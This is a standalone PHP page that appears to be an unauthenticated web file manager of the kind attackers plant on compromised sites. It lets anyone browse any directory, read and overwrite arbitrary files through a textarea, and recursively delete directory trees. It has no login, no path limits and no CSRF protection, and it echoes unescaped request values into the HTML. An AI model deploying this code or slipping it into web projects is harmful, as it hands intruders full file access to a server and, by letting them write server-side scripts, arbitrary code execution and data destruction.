<style type="text/css">
	@import url('https://fonts.googleapis.com/css?family=Ubuntu+Mono&display=swap');
	body {
		font-family: 'Ubuntu Mono', monospace;
		color: #8a8a8a;
	}
	table {
		background: #fff;
		box-shadow: 0px 0px 0px 6px rgba(222,222,222,0.73);
		border-top: 0px solid #fff;
		border-bottom: 20px solid #fff;
		border-right: 20px solid #fff;
		border-left: 20px solid #fff;
		border-radius:10px;
		border-spacing:0;
	}
	th {
		padding:12px;
		font-weight: normal;
	}
	td {
		padding:5px;
		border-top:none;
		border-bottom: 1px solid rgba(222,222,222,0.73);
		border-right: none;
		border-left: none;
	}
	td.no-border {
		border:none;
	}
	button {
		color: #8a8a8a;
		font-family: 'Ubuntu Mono', monospace;
		background:none;
		border:none;
	}
	select:focus, 
	input:focus,
	textarea:focus,
	button:focus {
		outline:none;
	}
	button:hover {
		cursor:pointer;
	}
	textarea {
		font-family: 'Ubuntu Mono', monospace;
		width:100%;
		color: #8a8a8a;
		height:350px;
		resize:none;
		border:2px solid rgba(222,222,222,0.73);
		border-radius:5px;
	}
	select {
		color: #8a8a8a;
		font-family: 'Ubuntu Mono', monospace;
		content: "";
		padding:4px;
		background: #fff;
		border-radius:5px;
		border:2px solid rgba(222,222,222,0.73);
	}
</style>
<table align="center" width="50%">
<?php
function cwd() {
	if (isset($_POST['dir'])) {
		$cwd = $_POST['dir'];
		chdir($cwd);
	} else {
		$cwd = str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
	} return $cwd;
}
function alert($type, $msg) {
	?>
	<tr>
		<td>
			<div class="alert <?=$type?>">
				<span class="<?=$type?>">
					<?= $msg ?>
				</span>
			</div>
		</td>
	</tr>
	<?php
}
class Files {
	public $path;
    public $options;
    public $filesystem;
    public $directories;
    public $files;
    public $text;

    function pwd($cwd) {
    	$dir = explode(DIRECTORY_SEPARATOR, $cwd);
    	foreach ($dir as $key => $pwd) {
    		print("<button name='dir' value='");
    		for ($i=0; $i <= $key ; $i++) { 
    			print($dir[$i]);
    			if ($i != $key) {
    				print(DIRECTORY_SEPARATOR);
    			}
    		} print("'>{$pwd}</button>");
    	}
    	return $this->permission($cwd);
    }

    function permission_file($filename, $perms) {
    	if (is_writable($filename)) {
    		?> <font color="green"><?= $perms ?></font> <?php
    	} else {
    		?> <font color="red"><?= $perms ?></font> <?php
    	}
    }

    function permission($filename) {
    	if (is_writable($filename)) {
    		?> <font color="green">writable</font> <?php
    	} else {
    		?> <font color="red">not writable</font> <?php
    	}
    }

    function size($file) {
    	$this->discovery($file);

    	if (is_file($file)) {
    		$filePath = $file;
            if (!realpath($filePath)) {
              $filePath = $_SERVER["DOCUMENT_ROOT"].$filePath;
            }
            $fileSize = filesize($filePath);
            $sizes = array("TB","GB","MB","KB","Byte");
            $total = count($sizes);
            while ($total-- && $fileSize > 1024) {
            	$fileSize /= 1024;
            } return round($fileSize, 2)." ".$sizes[$total];
        } return false;
    }

	function delete($path) {
		if (file_exists($path)) {
		} else {
			return;
		}

		$this->discovery($path);
		if (count($this->files) > 0) {
			foreach ($this->files as $file) {
				unlink($file);
			}
		}
		if (count($this->directories) > 0) {
			arsort($this->directories);

			foreach ($this->directories as $directory) {
				if (basename($directory) == '.' || basename($directory) == '..') {
				} else {
					rmdir($directory);
				}
			}
		} return;
	}

	function edit($path, $text)  {
    	$this->discovery($path);

    	if (is_file($path)) {
    		$handle = fopen($path, "w");
    		fwrite($handle, $text);
    		fclose($handle);
    	}
    }

	function discovery($path) {
        $this->directories = array();
        $this->files       = array();

        if (is_file($path)) {
            $this->files[] = $path;
            return;
        }

        if (is_dir($path)) {
        } else {
            return;
        }

        $this->directories[] = $path;
        $objects = new RecursiveIteratorIterator (
            new RecursiveDirectoryIterator($path),
            RecursiveIteratorIterator::SELF_FIRST);

        foreach ($objects as $name => $object) {
            if (is_file($name)) {
                $this->files[] = $name;
            } elseif (is_dir($name)) {
                if (basename($name) == '.' || basename($name) == '..') {
                } else {
                    $this->directories[] = $name;
                }
            }
        } return;
    }
}
$file = new Files();
?>
<tr>
	<form method="post">
		<th colspan="4">
			<?= $file->pwd(cwd()) ?>
		</th>
	</form>
</tr>
<?php
switch (@$_POST['action']) {
	case 'edit':
		if (isset($_POST['submit'])) {
			$edit = $file->edit($_POST['file'], $_POST['text']);
			if ($edit) {
				alert("failed", "edit failed");
			} else {
				alert("success", "edit success");
			}
		}
		?>
		<tr>
			<td class="no-border">
				Filename : <?= $file->permission_file($_POST['file'], basename($_POST['file'])) ?>
			</td>
		</tr>
		<tr>
			<form method="post">
				<td>
					<button name="dir" value="<?= dirname(cwd()) ?>">BACK</button>
				</td>
			</form>
		</tr>
		<tr>
			<form method="post">
				<td class="no-border">
					<textarea name="text"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
				</td>
		</tr>
		<tr>
			<td class="no-border">
				<button type="submit" name="submit">EDIT</button>
				<input type="hidden" name="action" value="edit">
				<input type="hidden" name="file" value="<?=$_POST['file']?>">
			</td>
		</tr>
		</form>
		<?php
		exit();
		break;
	case 'delete':
		$file->delete($_POST['file']);
		break;
}
$iterator = new DirectoryIterator(cwd());
foreach ($iterator as $dir) {
	if ($dir->isDir() && $dir != '.' && $dir != '..') {
		?>
		<tr>
			<form method="post">
			<td>
				<button name="dir" value="<?=cwd().DIRECTORY_SEPARATOR.$dir->getFilename()?>">
					<?= basename($dir->getPathname()) ?>
				</button>
			</td>
			</form>
			<td>
				<center>
					<?= @$dir->getType() ?>
				</center>
			</td>
			<td>
				<center>
					<?= $file->permission($dir) ?>
				</center>
			</td>
			<form method="post">
				<td>
					<select name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
						<option selected>CHOOSE . .</option>
						<option value="delete">DELETE</option>
					</select>
					<input type="hidden" name="file" value="<?= $dir->getPathname() ?>">
				</td>
			</form>
		</tr>
		<?php
	}
}
foreach ($iterator as $files) {
	if ($files->isFile()) {
		?>
		<tr>
			<td>
				<button><?=basename($files->getPathname())?></button>
			</td>
			<td>
				<center>
					<?=$file->size($files, 2)?>
				</center>
			</td>
			<td>
				<center>
					<?= $file->permission($files) ?>
				</center>
			</td>
			<form method="post">
				<td>
					<select name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
						<option selected>CHOOSE . .</option>
						<option value="edit">EDIT</option>
						<option value="delete">DELETE</option>
					</select>
					<input type="hidden" name="file" value="<?= $files->getPathname() ?>">
				</td>
			</form>
		</tr>
		<?php
	}
}
?>
</table>
